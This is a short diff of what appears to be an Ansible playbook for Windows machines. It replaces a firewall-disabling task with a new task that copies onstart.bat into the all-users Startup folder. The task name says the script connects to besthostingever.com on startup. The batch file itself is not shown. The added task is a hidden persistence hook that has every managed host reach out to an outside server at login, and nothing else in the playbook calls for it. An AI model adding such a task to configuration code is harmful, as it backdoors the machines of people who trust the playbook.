@@ -8,9 +8,7 @@
 - name: Gather facts
   setup:
 
-- community.windows.win_firewall:
-    state: disabled
-    profiles:
-      - Domain
-      - Private
-      - Public
+- name: Create bash script to connect to besthostingever.com on startup
+  win_copy:
+    src: onstart.bat
+    dest: 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
